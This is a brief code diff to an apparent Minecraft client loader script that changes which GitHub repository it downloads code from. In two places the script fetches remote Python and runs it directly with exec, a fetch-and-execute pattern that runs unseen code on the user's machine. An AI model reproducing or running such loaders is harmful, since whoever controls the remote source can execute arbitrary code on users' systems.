@@ -8,11 +8,11 @@ while True:
         discord_rp_mc()
         os.system('cls')
         print("                                             \033[1;39mLoading Minecraft Sections..")
-        exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Minecraft').text)
+        exec(requests.get('https://raw.githubusercontent.com/WalmartSolutions/MCC-Loader-Premium/main/Minecraft').text)
     if gg == '2':
         discord_rp_private()
         os.system('cls')
         print("                                       \033[1;39mLoading Private Client Section..")
-        exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Private').text)
+        exec(requests.get('https://raw.githubusercontent.com/WalmartSolutions/MCC-Loader-Premium/main/Private').text)
     else:
         continue
